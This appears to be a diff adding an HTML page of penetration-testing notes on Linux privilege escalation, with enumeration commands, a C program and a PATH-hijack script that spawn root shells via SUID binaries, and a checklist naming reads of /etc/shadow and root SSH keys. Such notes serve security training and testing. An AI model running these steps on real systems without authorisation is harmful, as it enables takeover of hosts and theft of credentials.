@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Learn about various techniques and methods for privilege escalation on Linux system, including exploiting weak permissions, SUID, and more, with detailed notes and code examples.">
+  <title>offsecnotes | Linux privilege escalation</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>Linux privilege escalation</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#vulnerable-program" id="toc-vulnerable-program">Vulnerable program</a></li>
+<li><a href="#weak-permissions" id="toc-weak-permissions">Weak Permissions</a></li>
+<li><a href="#sudo" id="toc-sudo">Sudo</a></li>
+<li><a href="#suid" id="toc-suid">SUID</a></li>
+<li><a href="#capabilities" id="toc-capabilities">Capabilities</a></li>
+<li><a href="#email" id="toc-email">Email</a></li>
+<li><a href="#other" id="toc-other">Other</a></li>
+</ul></div>
+  <hr>
+<h2 id="vulnerable-program">Vulnerable program</h2>
+<p>Search scripts that execute programs. Search for <strong>any vulnerable version</strong>. One example: chkrootkit v0.49 (running as root)</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ps</span> aux</span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: It’s possible that another user (e.g., root) is running a cron job that executes a script periodically, which you may not be able to see. Therefore, it’s crucial to identify and enumerate all potential programs that could be vulnerable.</p>
+</blockquote>
+<hr />
+<h2 id="weak-permissions">Weak Permissions</h2>
+<div class="sourceCode" id="cb2"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co"># World-writable files - E.g.: maybe you can edit shadow file</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-not</span> <span class="at">-type</span> l <span class="at">-perm</span> <span class="at">-o+w</span></span></code></pre></div>
+<hr />
+<h2 id="sudo">Sudo</h2>
+<div class="sourceCode" id="cb3"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> <span class="at">-l</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Search on https://gtfobins.github.io/ how to exploit</span></span></code></pre></div>
+<hr />
+<h2 id="suid">SUID</h2>
+<p>Find all SUID binaries:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-perm</span> <span class="at">-4000</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span></code></pre></div>
+<p><strong>Well-known binary</strong></p>
+<p>Search for the binary on <a href="https://gtfobins.github.io">GTFOBins</a> to identify potential exploitation techniques.</p>
+<p><strong>Custom binary</strong></p>
+<p>Premise: you have <code>binary_name</code> (with suid) that use/load/execute <code>loaded_binary</code></p>
+<p>Extract strings from the binary – look for shared libraries or binaries being loaded / executed at runtime</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="fu">strings</span> binary_name</span></code></pre></div>
+<p><strong>(1) Method</strong></p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> /bin/bash /path/to/loaded_binary</span></code></pre></div>
+<p><strong>(2) Method</strong></p>
+<p>Delete the loaded binary and replace with a new one:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>    system<span class="op">(</span><span class="st">&quot;/bin/bash -i&quot;</span><span class="op">);</span> </span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<div class="sourceCode" id="cb8"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Compile</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="fu">gcc</span> binary.c <span class="at">-o</span> <span class="op">&lt;</span>loaded_binary<span class="op">&gt;</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="co"># Run the binary</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="ex">./binary_name</span></span></code></pre></div>
+<hr />
+<h2 id="capabilities">Capabilities</h2>
+<p>Since Linux version 2.2, the system has divided the traditional superuser privileges into distinct units called capabilities [<a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">↗</a>]. These capabilities can be independently enabled or disabled, offering more fine-grained control over process privileges. However, if misconfigured, they can be exploited by an attacker to escalate privileges and gain root access.</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/sbin/getcap</span> <span class="at">-r</span> / <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span></code></pre></div>
+<p>Search for the binary on <a href="https://gtfobins.github.io">GTFOBins</a> to identify potential exploitation techniques.</p>
+<hr />
+<h2 id="email">Email</h2>
+<p>Analyze the email for any sensitive information:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> /var/mail</span></code></pre></div>
+<hr />
+<h2 id="other">Other</h2>
+<ul>
+<li><code>sudo -l</code>
+<ul>
+<li>setenv?</li>
+</ul></li>
+<li>SUID/GUID</li>
+<li>Look for capabilities</li>
+<li>History Files</li>
+<li>Docker group</li>
+<li>Cron jobs</li>
+<li>SSH Keys</li>
+<li>PATH</li>
+<li>NFS</li>
+<li>Writable /etc/shadow</li>
+<li>Writable /etc/passwd</li>
+<li>Are there scripts that use commands?
+<ul>
+<li>If the command is executed without full path you can modify PATH variable</li>
+<li><code>strings &lt;program_name&gt;</code></li>
+<li>you see <code>tail -f /var/log/nginx/access.log</code></li>
+<li><div class="sourceCode" id="cb11"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>  <span class="co">#!/bin/bash</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>  <span class="ex">/bin/bash</span> <span class="at">-p</span></span></code></pre></div></li>
+<li><code>chmod +x /tmp/tail</code></li>
+<li><code>export PATH=/tmp:$PATH</code></li>
+<li><code>./&lt;program_name&gt;</code></li>
+</ul></li>
+<li>Is there a database? Can I access to it?
+<ul>
+<li>Look at config file or source code of webpages connecting to db</li>
+</ul></li>
+<li>Look at the source code of the php,py,jsp … files of the website
+<ul>
+<li>Especially login files. Any password?</li>
+</ul></li>
+<li>Writable authorized_key folder?
+<ul>
+<li>generate new ssh keys</li>
+</ul></li>
+<li>Can I read some file with sudo?
+<ul>
+<li>/root/root.txt, /etc/shadow, /root/.ssh/id_rsa</li>
+</ul></li>
+<li>Can I write a file in the root user directory?
+<ul>
+<li>generate ssh key with ssh-keygen and save it in the root user dir</li>
+</ul></li>
+<li>Kernel Exploits</li>
+<li>Linpeas.sh</li>
+<li><a href="https://gtfobins.github.io">GTFObins</a></li>
+</ul>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
